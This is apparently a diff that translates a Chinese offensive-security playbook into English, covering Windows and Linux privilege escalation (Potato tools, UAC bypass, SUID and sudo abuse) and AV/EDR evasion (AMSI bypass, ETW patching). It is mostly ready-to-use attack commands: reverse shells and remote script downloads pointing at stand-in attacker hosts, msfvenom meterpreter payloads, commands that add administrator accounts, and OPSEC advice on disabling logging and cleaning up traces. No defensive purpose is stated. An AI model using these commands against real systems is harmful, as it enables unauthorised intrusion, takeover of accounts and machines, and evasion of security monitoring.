 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
 ```
 
 **4. PrintSpoofer**  _[windows]_
-_PrintSpoofer提权_
+_PrintSpoofer privilege escalation_
 ```
 PrintSpoofer.exe -i -c cmd
 ```
 
 **5. GodPotato**  _[windows]_
-_GodPotato提权，支持更多Windows版本_
+_GodPotato privilege escalation, supporting more Windows versions_
 ```
 GodPotato.exe -cmd "cmd /c whoami"
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
 **1. RoguePotato**
-_RoguePotato，绕过更多限制_
+_RoguePotato, bypassing more restrictions_
 ```
 RoguePotato.exe -r attacker_ip -l 9999 -e "cmd.exe"
 ```
 
-**分析：** 令牌窃取成功后可以模拟高权限用户身份执行操作。
+**Analysis:** a successful token theft lets you act as a higher-privileged user.
 
-**OPSEC：** Potato系列工具利用DCOM机制；需要SeImpersonatePrivilege权限；不同Windows版本需要不同的CLSID
+**OPSEC:** the Potato tools abuse DCOM; they require SeImpersonatePrivilege; different Windows versions need different CLSIDs
 
 ---
 
-### Windows权限提升  `windows-privesc`
-Windows系统提权技术
-子类：**Windows** · tags: `privesc` `windows` `privilege`
+### Windows privilege escalation  `windows-privesc`
+Windows privilege escalation techniques
+Subcategory: **Windows** · tags: `privesc` `windows` `privilege`
 
-**前置条件：** 普通用户权限；系统漏洞
+**Preconditions:** ordinary user privileges; a system vulnerability
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检查提权向量**  _[windows]_
-_检查当前权限_
+**1. Check privilege-escalation vectors**  _[windows]_
+_Check current privileges_
 ```
 whoami /priv
 whoami /groups
 ```
 
-**2. 使用WinPEAS**  _[windows]_
-_自动化提权检查_
+**2. Using WinPEAS**  _[windows]_
+_Automated privilege-escalation checks_
 ```
 winpeas.exe
 ```
 
-**3. 检查服务权限**  _[windows]_
-_检查可写服务_
+**3. Check service permissions**  _[windows]_
+_Check for writable services_
 ```
 accesschk.exe -uwcqv "Everyone" *
 ```
 
-**4. 检查未引用服务路径**  _[windows]_
-_查找未引用服务路径_
+**4. Check for unquoted service paths**  _[windows]_
+_Find unquoted service paths_
 ```
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"  | findstr /i /v """
 ```
 
 ---
 
-### Linux权限提升  `linux-privesc`
-Linux系统提权技术
-子类：**Linux** · tags: `privesc` `linux` `privilege`
+### Linux privilege escalation  `linux-privesc`
+Linux privilege escalation techniques
+Subcategory: **Linux** · tags: `privesc` `linux` `privilege`
 
-**前置条件：** 普通用户权限；系统漏洞
+**Preconditions:** ordinary user privileges; a system vulnerability
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检查SUID**  _[linux]_
-_查找SUID文件_
+**1. Check SUID**  _[linux]_
+_Find SUID files_
 ```
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-**2. 检查Sudo**  _[linux]_
-_检查sudo权限_
+**2. Check sudo**  _[linux]_
+_Check sudo permissions_
 ```
 sudo -l
 ```
 
-**3. 检查Cron**  _[linux]_
-_检查计划任务_
+**3. Check cron**  _[linux]_
+_Check scheduled tasks_
 ```
 cat /etc/crontab
 ls -la /etc/cron*
 ```
 
-**4. 使用LinPEAS**  _[linux]_
-_自动化提权检查_
+**4. Using LinPEAS**  _[linux]_
+_Automated privilege-escalation checks_
 ```
 linpeas.sh
 ```
 
 ---
 
-### UAC绕过  `uac-bypass`
-绕过Windows用户账户控制
-子类：**UAC** · tags: `uac` `bypass` `windows`
+### UAC bypass  `uac-bypass`
+Bypass Windows User Account Control
+Subcategory: **UAC** · tags: `uac` `bypass` `windows`
 
-**前置条件：** 管理员组成员；UAC启用
+**Preconditions:** membership in the Administrators group; UAC enabled
 
-**攻击链：**
+**Attack chain:**
 
 **1. Fodhelper**  _[windows]_
-_通过fodhelper绕过UAC_
+_Bypass UAC via fodhelper_
 ```
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe" /f
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /d "" /f
@@ -1507,70 +1507,70 @@ fodhelper.exe
 ```
 
 **2. Eventvwr**  _[windows]_
-_通过eventvwr绕过UAC_
+_Bypass UAC via eventvwr_
 ```
 reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "cmd.exe" /f
 eventvwr.exe
 ```
 
-**3. 使用UACME**  _[windows]_
-_使用UACME工具_
+**3. Using UACME**  _[windows]_
+_Use the UACME tool_
 ```
 Akagi64.exe 23 cmd.exe
 ```
 
 ---
 
-### DLL劫持  `dll-hijack`
-通过DLL劫持提权
-子类：**DLL** · tags: `dll` `hijack` `privesc`
+### DLL hijacking  `dll-hijack`
+Escalate privileges via DLL hijacking
+Subcategory: **DLL** · tags: `dll` `hijack` `privesc`
 
-**前置条件：** 可写目录；DLL搜索顺序
+**Preconditions:** a writable directory; DLL search-order behavior
 
-**攻击链：**
+**Attack chain:**
 
-**1. 查找DLL劫持**  _[windows]_
-_监控进程加载的DLL_
+**1. Find DLL hijacks**  _[windows]_
+_Monitor DLLs loaded by processes_
 ```
-使用Procmon监控DLL加载
+Monitor DLL loading with Procmon
 ```
 
-**2. 创建恶意DLL**  _[linux]_
-_生成恶意DLL_
+**2. Build a malicious DLL**  _[linux]_
+_Generate a malicious DLL_
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
 ```
 
-**3. 放置DLL**  _[windows]_
-_放置DLL到目标位置_
+**3. Place the DLL**  _[windows]_
+_Place the DLL in the target location_
 ```
 copy evil.dll "C:\Program Files\VulnerableApp\missing.dll"
 ```
 
 ---
 
-### 服务提权  `service-exploit`
-通过服务漏洞提权
-子类：**服务** · tags: `service` `privesc` `windows`
+### Service privilege escalation  `service-exploit`
+Escalate privileges via a service vulnerability
+Subcategory: **Services** · tags: `service` `privesc` `windows`
 
-**前置条件：** 服务修改权限；可写服务路径
+**Preconditions:** rights to modify a service; a writable service path
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检查服务权限**  _[windows]_
-_检查用户可修改的服务_
+**1. Check service permissions**  _[windows]_
+_Check which services the user can modify_
 ```
 accesschk.exe -uwcqv "Users" *
 ```
 
-**2. 修改服务路径**  _[windows]_
-_修改服务执行路径_
+**2. Modify the service path**  _[windows]_
+_Change the service's executable path_
 ```
 sc config VulnerableService binPath= "cmd /c whoami"
 ```
 
-**3. 重启服务**  _[windows]_
-_重启服务执行命令_
+**3. Restart the service**  _[windows]_
+_Restart the service to run the command_
 ```
 sc stop VulnerableService
 sc start VulnerableService
@@ -1578,117 +1578,117 @@ sc start VulnerableService
 
 ---
 
-### AlwaysInstallElevated提权  `always-install`
-利用AlwaysInstallElevated提权
-子类：**MSI** · tags: `msi` `alwaysinstall` `privesc`
+### AlwaysInstallElevated privilege escalation  `always-install`
+Escalate privileges via AlwaysInstallElevated
+Subcategory: **MSI** · tags: `msi` `alwaysinstall` `privesc`
 
-**前置条件：** AlwaysInstallElevated启用
+**Preconditions:** AlwaysInstallElevated is enabled
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检查设置**  _[windows]_
-_检查是否启用_
+**1. Check the setting**  _[windows]_
+_Check whether it is enabled_
 ```
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
-**2. 创建MSI**  _[linux]_
-_生成恶意MSI_
+**2. Build an MSI**  _[linux]_
+_Generate a malicious MSI_
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f msi > evil.msi
 ```
 
-**3. 安装MSI**  _[windows]_
-_安装MSI执行代码_
+**3. Install the MSI**  _[windows]_
+_Install the MSI to run code_
 ```
 msiexec /quiet /qn /i evil.msi
 ```
 
 ---
 
-### Juicy Potato提权  `juicy-potato`
-利用COM对象和SeImpersonatePrivilege提权
-子类：**Potato** · tags: `juicy-potato` `com` `privesc`
+### Juicy Potato privilege escalation  `juicy-potato`
+Escalate privileges via COM objects and SeImpersonatePrivilege
+Subcategory: **Potato** · tags: `juicy-potato` `com` `privesc`
 
-**前置条件：** SeImpersonatePrivilege；Windows < 2019
+**Preconditions:** SeImpersonatePrivilege; Windows earlier than 2019
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检查权限**  _[windows]_
-_检查SeImpersonatePrivilege_
+**1. Check privileges**  _[windows]_
+_Check for SeImpersonatePrivilege_
 ```
 whoami /priv | findstr SeImpersonate
 ```
 
-**2. 执行JuicyPotato**  _[windows]_
-_使用JuicyPotato提权_
+**2. Run JuicyPotato**  _[windows]_
+_Escalate privileges with JuicyPotato_
 ```
 JuicyPotato.exe -t * -p cmd.exe -l 1337
 ```
 
 ---
 
-### PrintSpoofer提权  `printspoofer`
-利用打印机服务提权
-子类：**PrintSpoofer** · tags: `printspoofer` `privesc` `windows`
+### PrintSpoofer privilege escalation  `printspoofer`
+Escalate privileges via the print spooler service
+Subcategory: **PrintSpoofer** · tags: `printspoofer` `privesc` `windows`
 
-**前置条件：** SeImpersonatePrivilege
+**Preconditions:** SeImpersonatePrivilege
 
-**攻击链：**
+**Attack chain:**
 
-**1. 执行PrintSpoofer**  _[windows]_
-_使用PrintSpoofer提权_
+**1. Run PrintSpoofer**  _[windows]_
+_Escalate privileges with PrintSpoofer_
 ```
 PrintSpoofer.exe -i -c cmd
 ```
 
-**2. 指定命令**  _[windows]_
-_执行指定命令_
+**2. Specify a command**  _[windows]_
+_Run a specified command_
 ```
 PrintSpoofer.exe -c "whoami > C:\out.txt"
 ```
 
 ---
 
-### GodPotato提权  `godpotato`
-GodPotato提权工具
-子类：**GodPotato** · tags: `godpotato` `privesc` `windows`
+### GodPotato privilege escalation  `godpotato`
+The GodPotato privilege-escalation tool
+Subcategory: **GodPotato** · tags: `godpotato` `privesc` `windows`
 
-**前置条件：** SeImpersonatePrivilege
+**Preconditions:** SeImpersonatePrivilege
 
-**攻击链：**
+**Attack chain:**
 
-**1. 执行GodPotato**  _[windows]_
-_使用GodPotato提权_
+**1. Run GodPotato**  _[windows]_
+_Privilege escalation with GodPotato_
 ```
 GodPotato.exe -cmd "cmd /c whoami"
 ```
 
-**2. 反向Shell**  _[windows]_
-_执行反向Shell_
+**2. Reverse Shell**  _[windows]_
+_Execute a reverse shell_
 ```
 GodPotato.exe -cmd "cmd /c powershell -e BASE64_CMD"
 ```
 
 ---
 
-### SUID提权  `suid-exploit`
-利用SUID文件提权
-子类：**SUID** · tags: `suid` `privesc` `linux`
+### SUID Privilege Escalation  `suid-exploit`
+Privilege escalation via SUID files
+Subcategory: **SUID** · tags: `suid` `privesc` `linux`
 
-**前置条件：** 存在SUID文件；可利用程序
+**Preconditions:** A SUID file exists; an exploitable program
 
-**攻击链：**
+**Attack chain:**
 
-**1. 查找SUID**  _[linux]_
-_查找所有SUID文件_
+**1. Find SUID**  _[linux]_
+_Find all SUID files_
 ```
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-**2. 常见可利用程序**  _[linux]_
-_常见SUID利用方法_
+**2. Common exploitable programs**  _[linux]_
+_Common SUID exploitation methods_
 ```
 nmap --interactive
 vim -c ':!/bin/sh'
@@ -1697,29 +1697,29 @@ cp /bin/sh /tmp/sh; chmod +s /tmp/sh
 ```
 
 **3. GTFOBins**  _[linux]_
-_查找程序利用方法_
+_Find exploitation methods for a program_
 ```
-参考GTFOBins网站查找可利用程序
+Consult the GTFOBins website to find exploitable programs
 ```
 
 ---
 
-### Sudo提权  `sudo-exploit`
-利用Sudo配置提权
-子类：**Sudo** · tags: `sudo` `privesc` `linux`
+### Sudo Privilege Escalation  `sudo-exploit`
+Privilege escalation via Sudo configuration
+Subcategory: **Sudo** · tags: `sudo` `privesc` `linux`
 
-**前置条件：** Sudo权限配置不当
+**Preconditions:** Misconfigured Sudo privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检查Sudo权限**  _[linux]_
-_列出可执行的sudo命令_
+**1. Check Sudo privileges**  _[linux]_
+_List the sudo commands that can be run_
 ```
 sudo -l
 ```
 
-**2. 常见利用**  _[linux]_
-_常见sudo利用方法_
+**2. Common exploitation**  _[linux]_
+_Common sudo exploitation methods_
 ```
 sudo vim -c ':!/bin/sh'
 sudo find / -exec /bin/sh \;
@@ -1727,66 +1727,66 @@ sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
 **3. CVE-2021-3156**  _[linux]_
-_Baron Samedit漏洞_
+_Baron Samedit vulnerability_
 ```
-利用sudo堆溢出漏洞
+Exploit the sudo heap-overflow vulnerability
 ```
 
 ---
 
-### Cron提权  `cron-exploit`
-利用Cron任务提权
-子类：**Cron** · tags: `cron` `privesc` `linux`
+### Cron Privilege Escalation  `cron-exploit`
+Privilege escalation via Cron jobs
+Subcategory: **Cron** · tags: `cron` `privesc` `linux`
 
-**前置条件：** 可写Cron脚本；通配符注入
+**Preconditions:** A writable Cron script; wildcard injection
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检查Cron任务**  _[linux]_
-_查看计划任务_
+**1. Check Cron jobs**  _[linux]_
+_View scheduled tasks_
 ```
 cat /etc/crontab
 ls -la /etc/cron*
 ```
 
-**2. 检查脚本权限**  _[linux]_
-_检查Cron脚本权限_
+**2. Check script permissions**  _[linux]_
+_Check Cron script permissions_
 ```
 ls -la /path/to/cron/script.sh
 ```
 
-**3. 通配符注入**  _[linux]_
-_利用tar通配符注入_
+**3. Wildcard injection**  _[linux]_
+_Exploit tar wildcard injection_
 ```
-在Cron目录创建: --checkpoint=1
+Create in the Cron directory: --checkpoint=1
 --checkpoint-action=exec=sh shell.sh
 ```
 
 ---
 
-### 内核漏洞提权  `kernel-exploit`
-利用内核漏洞提权
-子类：**内核** · tags: `kernel` `privesc` `exploit`
+### Kernel Exploit Privilege Escalation  `kernel-exploit`
+Privilege escalation via kernel vulnerabilities
+Subcategory: **Kernel** · tags: `kernel` `privesc` `exploit`
 
-**前置条件：** 存在内核漏洞；可编译/执行exploit
+**Preconditions:** A kernel vulnerability exists; you can compile/run the exploit
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检查内核版本**  _[linux]_
-_查看内核版本信息_
+**1. Check kernel version**  _[linux]_
+_View kernel version information_
 ```
 uname -a
 cat /proc/version
 ```
 
-**2. 搜索exploit**  _[linux]_
-_搜索内核exploit_
+**2. Search for an exploit**  _[linux]_
+_Search for a kernel exploit_
 ```
 searchsploit kernel VERSION
 ```
 
-**3. 常见内核漏洞**  _[linux]_
-_常见内核提权漏洞_
+**3. Common kernel vulnerabilities**  _[linux]_
+_Common kernel privilege-escalation vulnerabilities_
 ```
 DirtyCow (CVE-2016-5195)
 DirtyPipe (CVE-2022-0847)
@@ -1795,214 +1795,214 @@ PwnKit (CVE-2021-4034)
 
 ---
 
-### Potato系列提权攻击  `potato-attack`
-利用Windows令牌模拟和NTLM中继机制从服务账户(SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege)提权到SYSTEM
-子类：**Potato提权** · tags: `privilege-escalation` `potato` `token-impersonation` `ntlm-relay` `windows`
+### Potato-Family Privilege Escalation Attacks  `potato-attack`
+Use Windows token impersonation and NTLM relay mechanisms to escalate from a service account (SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege) to SYSTEM
+Subcategory: **Potato Privesc** · tags: `privilege-escalation` `potato` `token-impersonation` `ntlm-relay` `windows`
 
-**前置条件：** 拥有SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege权限；常见于IIS AppPool、SQL Server、各类服务账户
+**Preconditions:** Hold SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege; common on IIS AppPool, SQL Server, and various service accounts
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检查当前权限**  _[windows]_
-_首先确认当前用户是否拥有令牌模拟权限。IIS应用池账户、SQL Server服务账户、Windows服务账户通常默认拥有该权限_
+**1. Check current privileges**  _[windows]_
+_First confirm whether the current user holds token-impersonation privileges. IIS application-pool accounts, SQL Server service accounts, and Windows service accounts usually hold this privilege by default_
 ```
-# 检查是否拥有Impersonate权限
+# Check whether Impersonate privilege is held
 whoami /priv
 
-# 重点关注以下权限:
-# SeImpersonatePrivilege - 模拟客户端令牌
-# SeAssignPrimaryTokenPrivilege - 替换进程级令牌
+# Focus on the following privileges:
+# SeImpersonatePrivilege - impersonate a client token
+# SeAssignPrimaryTokenPrivilege - replace a process-level token
 
-# 确认当前用户身份
+# Confirm the current user identity
 whoami /all
 echo %USERNAME%
 ```
 
 **2. JuicyPotato (Windows Server 2016/2019)**  _[windows]_
-_JuicyPotato利用COM服务器和NTLM认证实现令牌模拟。通过创建本地COM服务器，欺骗SYSTEM账户向其认证，然后模拟该令牌执行命令_
+_JuicyPotato uses a COM server and NTLM authentication to achieve token impersonation. It creates a local COM server, tricks the SYSTEM account into authenticating to it, then impersonates that token to execute commands_
 ```
-# 下载JuicyPotato
+# Download JuicyPotato
 certutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\temp\jp.exe
 
-# 使用JuicyPotato提权执行命令
+# Use JuicyPotato to escalate and run a command
 C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\proof.txt" -t *
 
-# 使用特定CLSID (不同系统需要不同CLSID)
+# Use a specific CLSID (different systems need different CLSIDs)
 C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
 
-# 反弹Shell
+# Reverse shell
 C:\temp\jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *
 ```
 
 **3. PrintSpoofer (Windows 10/Server 2019+)**  _[windows]_
-_PrintSpoofer利用Windows打印服务的命名管道模拟功能。它创建一个命名管道并欺骗Print Spooler服务连接，从而获取SYSTEM令牌。适用于JuicyPotato无法使用的新版Windows_
+_PrintSpoofer abuses the named-pipe impersonation feature of the Windows print service. It creates a named pipe and tricks the Print Spooler service into connecting, thereby obtaining a SYSTEM token. It works on newer Windows versions where JuicyPotato no longer works_
 ```
-# PrintSpoofer - 利用打印服务命名管道
+# PrintSpoofer - abuse the print-service named pipe
 PrintSpoofer.exe -i -c cmd
 
-# 直接执行命令
+# Directly execute a command
 PrintSpoofer.exe -c "cmd /c whoami > C:\temp\proof.txt"
 
-# 反弹Shell
+# Reverse shell
 PrintSpoofer.exe -c "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"
 
-# 以SYSTEM身份启动PowerShell
+# Launch PowerShell as SYSTEM
 PrintSpoofer.exe -i -c powershell.exe
 ```
 
-**4. Sweet Potato (多技术集成)**  _[windows]_
-_SweetPotato集成了PrintSpoofer、EfsPotato等多种技术，自动选择适合目标系统的攻击方式_
+**4. Sweet Potato (multi-technique integration)**  _[windows]_
+_SweetPotato combines multiple techniques such as PrintSpoofer and EfsPotato, automatically selecting the attack method suited to the target system_
 ```
-# SweetPotato - 集成多种Potato技术
+# SweetPotato - integrates multiple Potato techniques
 SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"
 
-# 指定攻击方式
+# Specify the attack method
 SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"
 ```
 
-**5. GodPotato (全版本通杀)**  _[windows]_
-_GodPotato利用DCOM OXID解析器的漏洞，无需指定CLSID，兼容几乎所有Windows版本。是目前最通用的Potato变种_
+**5. GodPotato (works on all versions)**  _[windows]_
+_GodPotato exploits a flaw in the DCOM OXID resolver, requires no CLSID, and is compatible with almost all Windows versions. It is currently the most universal Potato variant_
 ```
-# GodPotato - 适用于Windows Server 2012-2022所有版本
+# GodPotato - works on all Windows Server 2012-2022 versions
 GodPotato.exe -cmd "cmd /c whoami"
 
-# 执行反弹Shell
+# Execute a reverse shell
 GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe attacker_ip 4444"
 
-# 添加管理员
+# Add an administrator
 GodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"
 
-# 执行PowerShell
+# Execute PowerShell
 GodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
 ```
 
-**6. RoguePotato (远程场景)**  _[windows]_
-_RoguePotato是JuicyPotato的改进版，通过远程OXID解析器实现NTLM认证中继。需要一台攻击机辅助完成中继_
+**6. RoguePotato (remote scenario)**  _[windows]_
+_RoguePotato is an improved version of JuicyPotato that relays NTLM authentication through a remote OXID resolver. It needs a helper attack machine to complete the relay_
 ```
-# 攻击机 - 启动socat重定向
+# Attack machine - start socat redirection
 socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999
 
-# 目标机 - 执行RoguePotato
+# Target machine - run RoguePotato
 RoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\temp\proof.txt" -l 9999
 
-# 或使用netcat反弹
+# Or use a netcat reverse shell
 RoguePotato.exe -r attacker_ip -e "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999
 ```
 
-**7. Potato选型决策流程**  _[windows]_
-_根据目标系统版本选择合适的Potato变种工具_
+**7. Potato selection decision flow**  _[windows]_
+_Choose the appropriate Potato variant tool based on the target system version_
 ```
-# === 决策流程 ===
-# 1. whoami /priv 确认SeImpersonatePrivilege
-# 2. systeminfo 确认系统版本
+# === Decision flow ===
+# 1. whoami /priv to confirm SeImpersonatePrivilege
+# 2. systeminfo to confirm the system version
 #
 # Windows Server 2012-2016 => JuicyPotato
-# Windows Server 2019 (1809之前) => JuicyPotato (需正确CLSID)
-# Windows 10/Server 2019+ => PrintSpoofer 或 GodPotato
+# Windows Server 2019 (before 1809) => JuicyPotato (needs the correct CLSID)
+# Windows 10/Server 2019+ => PrintSpoofer or GodPotato
 # Windows Server 2022 => GodPotato
-# 所有版本 => SweetPotato (自动选择)
-# 需要远程中继 => RoguePotato
+# All versions => SweetPotato (auto-select)
+# Remote relay needed => RoguePotato
 #
-# 常用CLSID查询: https://ohpe.it/juicy-potato/CLSID/
+# Common CLSID lookup: https://ohpe.it/juicy-potato/CLSID/
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. 绕过EDR检测的Potato技巧**  _[windows]_
-_通过反射加载、重命名、使用较新工具等方式绕过EDR对Potato工具的检测_
+**1. Potato tricks to bypass EDR detection**  _[windows]_
+_Bypass EDR detection of Potato tools via reflective loading, renaming, using newer tools, and similar methods_
 ```
-# 1. 重命名二进制文件
+# 1. Rename the binary
 ren GodPotato.exe svcutil.exe
 
-# 2. 使用.NET反射加载(无文件落地)
+# 2. Use .NET reflective loading (no file on disk)
 powershell -ep bypass -c "$bytes=[System.IO.File]::ReadAllBytes('C:\temp\gp.exe');[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,@('-cmd','cmd /c whoami')))";
 
-# 3. 使用SharpToken替代(较新工具,签名较少)
+# 3. Use SharpToken instead (newer tool, fewer signatures)
 SharpToken.exe execute SYSTEM "cmd /c whoami"
 ```
 
-**分析：** Potato系列攻击利用Windows的令牌模拟机制——拥有SeImpersonatePrivilege的服务账户可以模拟向其认证的任何用户令牌。攻击者通过欺骗SYSTEM账户向本地COM服务器/命名管道认证，获取SYSTEM令牌后创建高权限进程。这是Web服务器(IIS)和数据库(SQL Server)提权最常见的方式之一。
+**Analysis:** Potato-family attacks abuse the Windows token-impersonation mechanism: a service account holding SeImpersonatePrivilege can impersonate any user token that authenticates to it. The attacker tricks the SYSTEM account into authenticating to a local COM server / named pipe, obtains a SYSTEM token, and then creates a high-privilege process. This is one of the most common privilege-escalation methods on web servers (IIS) and databases (SQL Server).
 
-**OPSEC：** 1) Potato工具的二进制文件特征明显，建议内存加载 2) 创建的命名管道名称可能被监控 3) 成功后立即清理工具和临时文件 4) 避免使用net user等敏感命令，改用更隐蔽的后渗透方式
+**OPSEC:** 1) Potato tool binaries have obvious signatures; in-memory loading is recommended. 2) The named-pipe names created may be monitored. 3) Clean up tools and temporary files immediately after success. 4) Avoid sensitive commands like net user; use stealthier post-exploitation methods instead.
 
 ---
 
-## 免杀与规避
+## AV evasion
 
-### PowerShell免杀  `evasion-powershell`
-PowerShell脚本免杀技术
-子类：**PowerShell** · tags: `powershell` `evasion` `obfuscation`
+### PowerShell AV Evasion  `evasion-powershell`
+PowerShell script AV-evasion techniques
+Subcategory: **PowerShell** · tags: `powershell` `evasion` `obfuscation`
 
-**前置条件：** 目标机器访问权限；Windows系统
+**Preconditions:** Access to the target machine; Windows system
 
-**攻击链：**
+**Attack chain:**
 
-**1. 编码执行**  _[windows]_
-_Base64编码执行_
+**1. Encoded execution**  _[windows]_
+_Execute via Base64 encoding_
 ```
 powershell -enc BASE64_ENCODED_COMMAND
 ```
 
-**2. 远程加载**  _[windows]_
-_远程加载脚本_
+**2. Remote loading**  _[windows]_
+_Load a script remotely_
 ```
 IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")
 ```
 
-**3. 混淆变量名**  _[windows]_
-_变量名混淆_
+**3. Obfuscate variable names**  _[windows]_
+_Variable-name obfuscation_
 ```
 1='IEX'; 2='(New-Object Net.WebClient).DownloadString'; Invoke-Expression "1 2"
 ```
 
-**4. 无文件执行**  _[windows]_
-_隐藏窗口无配置文件执行_
+**4. Fileless execution**  _[windows]_
+_Hidden window, no profile execution_
 ```
 powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(\"http://attacker/script.ps1\")"
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. 降级执行**
-_使用PowerShell v2绕过日志_
+**1. Downgrade execution**
+_Use PowerShell v2 to bypass logging_
 ```
 powershell -version 2 -c "command"
 ```
 
-**分析：** PowerShell免杀可以绕过杀毒软件检测执行恶意脚本。
+**Analysis:** PowerShell AV evasion can bypass antivirus detection to execute malicious scripts.
 
-**OPSEC：** PowerShell日志可能记录命令；考虑禁用日志；使用混淆技术
+**OPSEC:** PowerShell logs may record commands; consider disabling logging; use obfuscation techniques
 
 ---
 
-### AMSI绕过  `amsi-bypass`
-绕过反恶意软件扫描接口
-子类：**AMSI绕过** · tags: `amsi` `bypass` `evasion`
+### AMSI Bypass  `amsi-bypass`
+Bypass the Antimalware Scan Interface
+Subcategory: **AMSI Bypass** · tags: `amsi` `bypass` `evasion`
 
-**前置条件：** PowerShell环境；AMSI启用
+**Preconditions:** PowerShell environment; AMSI enabled
 
-**攻击链：**
+**Attack chain:**
 
-**1. 反射绕过**  _[windows]_
-_通过反射禁用AMSI_
+**1. Reflection bypass**  _[windows]_
+_Disable AMSI via reflection_
 ```
 [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
 ```
 
-**2. 内存修补**  _[windows]_
-_混淆版本绕过_
+**2. Memory patching**  _[windows]_
+_Obfuscated-version bypass_
 ```
 $a=[Ref].Assembly.GetTypes();ForEach($x in $a){if($x.Name -like "*iUtils"){$z=$x}};$y=$z.GetFields("NonPublic,Static");ForEach($x in $y){if($x.Name -like "*itFailed"){$x.SetValue($null,$true)}}
 ```
 
-**3. DLL劫持**  _[windows]_
-_通过DLL劫持绕过_
+**3. DLL hijacking**  _[windows]_
+_Bypass via DLL hijacking_
 ```
-替换或劫持amsi.dll
+Replace or hijack amsi.dll
 ```
 
-**4. 使用工具**  _[windows]_
-_使用现成工具_
+**4. Use a tool**  _[windows]_
+_Use a ready-made tool_
 ```
 Import-Module .\AmsiBypass.ps1
 Invoke-AmsiBypass
@@ -2010,26 +2010,26 @@ Invoke-AmsiBypass
 
 ---
 
-### ETW Patch绕过  `etw-patch`
-禁用ETW监控
-子类：**ETW** · tags: `etw` `bypass` `evasion`
+### ETW Patch bypass  `etw-patch`
+Disable ETW monitoring
+Subclass: **ETW** · tags: `etw` `bypass` `evasion`
 
-**前置条件：** 代码执行权限
+**Prerequisites:** code execution privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. PowerShell禁用ETW**  _[windows]_
-_PowerShell禁用ETW_
+**1. Disable ETW via PowerShell**  _[windows]_
+_Disable ETW via PowerShell_
 ```
 [System.Diagnostics.Eventing.EventProvider]::SetEnabled([System.Guid]::NewGuid(), 0, 0)
-或
+or
 [Reflection.Assembly]::LoadWithPartialName("System.Diagnostics.Tracing") | Out-Null
 $etw = [System.Diagnostics.Tracing.EventProvider]::new([Guid]::NewGuid())
 $etw.SetEnabled(0)
 ```
 
-**2. C#禁用ETW**  _[windows]_
-_C#禁用ETW_
+**2. Disable ETW via C#**  _[windows]_
+_Disable ETW via C#_
 ```
 Assembly.Load("System.Diagnostics.Tracing")
 Type etwType = typeof(EventProvider)
@@ -2037,8 +2037,8 @@ MethodInfo setEnabled = etwType.GetMethod("SetEnabled", BindingFlags.NonPublic |
 setEnabled.Invoke(null, new object[] { Guid.NewGuid(), 0, 0 })
 ```
 
-**3. 修补ntdll**  _[windows]_
-_修补EtwEventWrite_
+**3. Patch ntdll**  _[windows]_
+_Patch EtwEventWrite_
 ```
 $ntdll = [Win32.Kernel32]::LoadLibrary("ntdll.dll")
 $etwEventWrite = [Win32.Kernel32]::GetProcAddress($ntdll, "EtwEventWrite")
@@ -2049,51 +2049,51 @@ $etwEventWrite = [Win32.Kernel32]::GetProcAddress($ntdll, "EtwEventWrite")
 ---
 
 ### API Unhooking  `api-unhooking`
-移除EDR的API Hook
-子类：**Unhooking** · tags: `unhooking` `hook` `evasion`
+Remove EDR API hooks
+Subclass: **Unhooking** · tags: `unhooking` `hook` `evasion`
 
